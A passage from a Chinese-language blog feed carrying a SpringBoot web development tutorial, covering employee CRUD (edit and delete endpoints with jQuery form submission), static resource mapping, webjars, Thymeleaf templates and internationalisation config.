class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来我们要修改Spring Boot的配置文件，启用从 hidden 的input标签解析请求方式的功能：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">hiddenmethod:</span></span><br><span class="line">      <span class="attr">filter:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>大功告成，现在点击员工旁的edit按钮，可以看到来到了add页面，而且输入框中预先填写了员工的当前数据：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-23-20-33-02.png" alt="" /></p><p>修改这个员工的邮箱为 <code>frank@test.com.cn</code> 点击提交，可以看到回到了员工列表页面，并且员工的信息已经显示为修改后的值：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-23-20-34-28.png" alt="" /></p><h2 id="员工删除"><a class="markdownIt-Anchor" href="#员工删除"></a> 员工删除</h2><p>第一步仍然是编写 Controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping(&quot;/employee/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">deleteEmployee</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span></span>&#123;</span><br><span class="line">    employeeRepository.deleteById(id);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/employee&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改页面的删除按钮，为了避免一个按钮一个表单的臃肿，我们将表单和按钮分开，给按钮添加监听并用JavaScript来提交表单，首先修改删除按钮：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用th:attr添加了一个员工id的参数，用于区分是哪个按钮被点击了，同时在class中添加del-btn --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm btn-danger del-btn&quot;</span> <span class="attr">th:attr</span>=<span class="string">&quot;employee-id=$&#123;employee.id&#125;&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在 <code>&lt;main&gt;</code> 标签外添加一个 form：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;del-form&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在 <code>&lt;body&gt;</code> 标签下添加脚本：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 旧版本写法</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;.del-btn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;#del-form&quot;</span>).attr(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;/employee/&quot;</span> + $(<span class="built_in">this</span>).attr(<span class="string">&quot;employee-id&quot;</span>)).submit();</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript">    <span class="comment">// ES6 写法</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;.del-btn&quot;</span>).click(<span class="function">(<span class="params">event</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;#del-form&quot;</span>).attr(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;/employee/&quot;</span> + $(event.target).attr(<span class="string">&quot;employee-id&quot;</span>)).submit();</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完成后重新启动项目，点击删除按钮，可以发现员工成功的被删除了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第二部分我们来实现员工的CRUD：&lt;/p&gt;
&lt;h1 id=&quot;rest-api&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rest-api&quot;&gt;&lt;/a&gt; REST API&lt;/h1&gt;
&lt;p&gt;为系统设计一下 RESTful API：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;th&gt;URI&lt;/th&gt;
&lt;th&gt;请求方式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;查询所有员工&lt;/td&gt;
&lt;td&gt;/employees&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查询一个员工&lt;/td&gt;
&lt;td&gt;/empoyee/{id}&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;添加员工&lt;/td&gt;
&lt;td&gt;/employee&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;修改员工&lt;/td&gt;
&lt;td&gt;/employee&lt;/td&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;删除员工&lt;/td&gt;
&lt;td&gt;/employee/{id}&lt;/td&gt;
&lt;td&gt;DELETE&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;</summary>
    
    
    
    <category term="找工作" scheme="https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="Spring" scheme="https://virgilchen97.github.io/tags/Spring/"/>
    
    <category term="SpringBoot" scheme="https://virgilchen97.github.io/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot Web 开发（一）</title>
    <link href="https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91/"/>
    <id>https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91/</id>
    <published>2020-06-16T05:03:37.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<p>在写这篇笔记之前我也有很多思考，我参考的教程中有很多SpringMVC以及JSP，模板引擎的内容。貌似现在的开发大环境下，后端需要兼顾手机App和网页版共同的请求，前后端分离是大的趋势。但是我仍然准备学习一下传统的服务器端渲染的相关技术。一方面是感受一下技术的演进，另一方面是前后端分离不利于SEO（Serach Engine Optimization），很多现有的产品仍然使用服务器渲染的原因就是搜索引擎。虽然现在可能会有一些更加成熟的方案（nodejs作为中间层），但是咱们还是一步一步来。第一部分我们熟悉模板引擎，静态资源映射，并实现简单的登录功能。</p><span id="more"></span><h1 id="spring-boot-静态资源映射"><a class="markdownIt-Anchor" href="#spring-boot-静态资源映射"></a> Spring Boot 静态资源映射</h1><p>在以往的SpringMVC中，我们会将静态资源文件储存在WEBAPP中，但是在SpringBoot中则有所不同。开始前使用 Spring Initializer 新建一个 restful-api 的项目。勾选 web, Spring Data JPA, MySQL 模块.</p><h2 id="1-webjars-jar包形式存在的静态资源"><a class="markdownIt-Anchor" href="#1-webjars-jar包形式存在的静态资源"></a> 1. <code>/webjars/**</code>: jar包形式存在的静态资源</h2><p>所有对于 <code>/webjars/**</code> 的访问都会去 <code>classpath:/META-INF/resources/webjars/</code> 下去找相应的资源。你可以通过 <a href="https://www.webjars.org/">webjars</a> 网站获取相应webjar的maven依赖，例如 <code>jQuery</code> 的依赖如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--引入Jquery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>你同样可以找到其他流行的web框架例如 Bootstrap, react 的webjar。作为测试我们吧 <code>jQuery</code> 的依赖添加到我们的项目中。在Idea的External Libraries中我们可以看到 <code>jQuery</code> 的 webjar 结构如下：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-14-14-23-28.png" alt="" /></p><p>所以如果此时我们启动项目，直接在浏览器访问 <code>localhost:8080/webjars/jquery/3.5.1/jquery.js</code> 我们便可以获取 <code>jquery.js</code> 这个文件的内容：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-14-14-28-09.png" alt="" /></p><h2 id="2-静态资源文件夹"><a class="markdownIt-Anchor" href="#2-静态资源文件夹"></a> 2. <code>/**</code> 静态资源文件夹</h2><p>所有对于 <code>/**</code> 路径的访问，如果没有被 <code>@RequestMapping</code> 绑定，那么SpringBoot会默认从一下文件夹获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;classpath:/META-INF/resources&quot;</span></span><br><span class="line"><span class="string">&quot;classpath:/resources&quot;</span>  <span class="comment">//注意这个不是我们创建工程中已经存在的resources，工程中已存在的resource实际是根目录</span></span><br><span class="line"><span class="string">&quot;classpath:/static&quot;</span></span><br><span class="line"><span class="string">&quot;classpath:/public&quot;</span></span><br><span class="line"><span class="string">&quot;/&quot;</span></span><br></pre></td></tr></table></figure><p>例如我们现在在 <code>resource/static</code> 文件夹下创建一个test.html:</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-14-14-54-59.png" alt="" /></p><p>内容为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时我们访问 <code>localhost:8080/test.html</code> ：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-14-14-56-21.png" alt="" /></p><p>可以看到资源成功访问，载入了test.html页面。</p><h2 id="3-欢迎页映射indexhtml"><a class="markdownIt-Anchor" href="#3-欢迎页映射indexhtml"></a> 3. 欢迎页映射：index.html</h2><p>如果我们直接访问 <code>localhost:8080/</code>，那么 SpringBoot 就会去每个资源文件夹下寻找index.html并返回，把刚才我们创建的 HTML 文件改名为 <code>index.html</code>，在浏览器中访问 <code>localhost:8080/</code> ，可以发现页面依然成功载入了。</p><h2 id="4-favicon"><a class="markdownIt-Anchor" href="#4-favicon"></a> 4. favicon</h2><p>定义网页图标，所有静态资源文件夹下的favicon.ico</p><h1 id="springboot-模板引擎"><a class="markdownIt-Anchor" href="#springboot-模板引擎"></a> SpringBoot 模板引擎</h1><p>JSP, velocity, Thymeleaf都是模板引擎。他们可以讲模板与数据结合，并生成最终的页面。SpringBoot 推荐的模板引擎时Thymeleaf。修改 pom.xml 引入 thymeleaf：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> Demo</h2><p>Thymeleaf 使用起来十分简单，我们只需要吧作为模板的HTML文件放在 <code>templates</code> 文件夹下，thymeleaf就会自动为我们渲染页面。我们先从一个简单的例子出发，首先在 <code>controller</code> 包下新建一个 <code>HelloController</code> 类，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span> <span class="comment">// 不是RestContoller，因为我们返回的不再是responsebody</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/success&quot;)</span> <span class="comment">// 处理 /success请求</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">success</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>; <span class="comment">// 返回模板页面名称</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在 <code>resource/template</code> 文件夹下创建一个 <code>success.html</code>，内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Success!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is a success message<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行项目，访问 <code>localhost:8080/success</code>:</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-14-15-23-50.png" alt="" /></p><p>更加具体的语法可以参考 <a href="https://www.thymeleaf.org/documentation.html">Thymeleaf 官方文档</a></p><h1 id="crud-实例"><a class="markdownIt-Anchor" href="#crud-实例"></a> CRUD 实例</h1><h2 id="引入静态资源"><a class="markdownIt-Anchor" href="#引入静态资源"></a> 引入静态资源</h2><p>将我们的 html, css, js 文件导入项目。完成后目录的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">├── main</span><br><span class="line">│   ├── java</span><br><span class="line">│   │   └── com</span><br><span class="line">│   │       └── cyf</span><br><span class="line">│   │           └── restfulapi</span><br><span class="line">│   │               └── RestfulApiApplication.java</span><br><span class="line">│   └── resources</span><br><span class="line">│       ├── application.properties</span><br><span class="line">│       ├── static</span><br><span class="line">│       │   └── asserts</span><br><span class="line">│       │       ├── css</span><br><span class="line">│       │       │   ├── bootstrap.min.css</span><br><span class="line">│       │       │   ├── dashboard.css</span><br><span class="line">│       │       │   └── signin.css</span><br><span class="line">│       │       ├── img</span><br><span class="line">│       │       │   └── bootstrap-solid.svg</span><br><span class="line">│       │       └── js</span><br><span class="line">│       │           ├── bootstrap.min.js</span><br><span class="line">│       │           ├── Chart.min.js</span><br><span class="line">│       │           ├── feather.min.js</span><br><span class="line">│       │           ├── jquery-3.2.1.slim.min.js</span><br><span class="line">│       │           └── popper.min.js</span><br><span class="line">│       └── templates</span><br><span class="line">│           ├── 404.html</span><br><span class="line">│           ├── dashboard.html</span><br><span class="line">│           ├── index.html</span><br><span class="line">│           ├── list.html</span><br><span class="line">└── test</span><br><span class="line">    └── java</span><br><span class="line">        └── com</span><br><span class="line">            └── cyf</span><br><span class="line">                └── restfulapi</span><br><span class="line">                    └── RestfulApiApplicationTests.java</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据我们之前学习的静态资源映射规则，现在我们启动项目，访问 <code>lcoalhost:8080</code>，可以发现首页已经显示出来了：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-15-12-59-16.png" alt="" /></p><p>目前我们的HTML文件名称就叫做 index.html，那么如果我们想要让首页默认是其他的html文件怎么办呢？例如我们讲我们的<code>index.html</code> 更改为 <code>login.html</code>。 简单的方法是我们可以在controller中写一个方法并且 <code>@RequestMapping(&quot;/&quot;)</code> 然后return需要作为默认页面的页面。还有一种方法是我们可以通过一个配置类来配置 SpringMVC，修改默认的主页。在 config 包下新建 <code>MyMvcConfig</code> 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span> <span class="comment">// 申明这是一个配置类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMvcConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        将我们定义的 WebMvcConfigurer 作为组件加入到容器中，SpringBoot进行自动配置的过程中，如果某个Bean在容器中已经存在，那么SpringBoot就会跳过该Bean的默认自动配置，在这里我们用我们自己的 webMvcConfigurer 替换了默认的 bean</span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">     <span class="function"><span class="keyword">public</span> WebMvcConfigurer <span class="title">webMvcConfigurer</span><span class="params">()</span></span>&#123;</span><br><span class="line">         WebMvcConfigurer webMvcConfigurer = <span class="keyword">new</span> WebMvcConfigurer() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">                registry.addViewController(<span class="string">&quot;/&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">                 registry.addViewController(<span class="string">&quot;/index.htm;&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;;</span><br><span class="line">         <span class="keyword">return</span> webMvcConfigurer;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问项目地址，你会发现默认载入的已经是 <code>login.html</code> 了。接下来还有的问题是咱们的几个html页面都是基于 Bootstrap 实现的，我们可以发现在我们的静态资源文件夹中也有和Bootstrap相关的js文件。我们之前讲过我们可以通过webjar的形式来引入静态资源，因此我们同样可以通过webjar来引入Bootstrap的相关依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bootstrap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来我们打开 login.html 修改 html 标签:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--启用模板引擎的智能提示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来我们发现 login.html 引用了我们 <code>asserts/css</code> 下的css文件，现在我们就可以通过模板引擎将这里修改为我们引入的webjar：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;asserts/css/bootstrap.min.css&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/webjars/bootstrap/4.5.0/css/bootstrap.css&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引用外部CSS或者用到相对路径都要用模板引擎替换，这样即使改变项目根目录地址，新的地址也会自动被模板引擎填写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;asserts/css/signin.css&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/asserts/css/signin.css&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对所有的html文件进行修改，重新访问项目地址，一切正常。</p><h2 id="国际化"><a class="markdownIt-Anchor" href="#国际化"></a> 国际化</h2><p>现实生活中我们有很多场景下需要提供App的国际化支持，SpringBoot自然也包含了这个特性。我们可以通过国际化配置文件来实现国际化。我们用登录页面 <code>login.html</code> 举例。首先，在 recourse 下创建 <code>i18n</code> 文件夹，然后添加三个文件 <code>login.properties</code>, <code>login_en_US.properties</code> 和 <code>login_zh_CN.properties</code>。如果需要支持更多的语言，则是添加更多的 <code>login_语言代码_区域代码.properties</code>。创建完成后，你会发现 Idea 已经自动将我们的配置文件归为了一个 Bundle：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-15-19-58-42.png" alt="" /></p><p>接下来选中 Bundle，并点击右下方的 Resource Bundle</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-15-20-02-24.png" alt="" /></p><p>为登录页面的每一处文本添加对应的配置：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-15-20-11-01.png" alt="" /></p><p>修改好了之后，我们需要告诉SpringBoot我们的配置文件的位置，让SpringBoot使用我们的配置文件，因此在application.yml中添加:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">messages:</span></span><br><span class="line">    <span class="attr">basename:</span> <span class="string">i18n.login</span></span><br></pre></td></tr></table></figure><p>值得注意的是 <code>spring.messages.basename</code> 自动配置的默认值是 <code>messages</code> 也就是说如果将 <code>messages.properties</code> 直接放在 resource 目录下，无须进行任何配置即可使用。对于较小规模的项目来说较为实用。做好了国际化相关的配置文件后，我们需要在模板中读取相应字段的值。以 Please Sign in 这个区域为例，修改 HTML 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;h3 mb-3 font-weight-normal&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;#&#123;login.prompt&#125;&quot;</span>&gt;</span>Please sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样我们的模板引擎便会根据语言将标签内的值替换成 <code>login.prompt</code> 的对应语言的文本，如果浏览器的默认语言是中文的话，页面中的对应文本就会变成中文：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-15-20-28-02.png" alt="" /></p><p>现在我们的页面会根据浏览器的语言设置切换语言。但是我们如后让用户通过点击来选择语言呢？在SpringBoot中，获取需要什么语言是由 <code>LocaleResolver</code> 组件来实现的，我们可以查看 <code>WebMvcAutoConfigurator</code> 类来查看这个组件的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;spring.mvc&quot;, name = &quot;locale&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> LocaleResolver <span class="title">localeResolver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mvcProperties.getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FixedLocaleResolver(<span class="keyword">this</span>.mvcProperties.getLocale());</span><br><span class="line">    &#125;</span><br><span class="line">    AcceptHeaderLocaleResolver localeResolver = <span class="keyword">new</span> AcceptHeaderLocaleResolver();</span><br><span class="line">    localeResolver.setDefaultLocale(<span class="keyword">this</span>.mvcProperties.getLocale());</span><br><span class="line">    <span class="keyword">return</span> localeResolver;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到默认的 LocaleResolver 是通过浏览器发送的请求的请求头中的 <code>Accept-Language</code> 来决定语言。为了实现我们的目标，我们可以讲需要的语言作为请求参数，实现一个我们自己的 <code>LocaleResolver</code>，我们在 component 包下建立新的类 <code>MyLocaleResolver</code> 并实现 <code>LocaleResolver</code> 接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 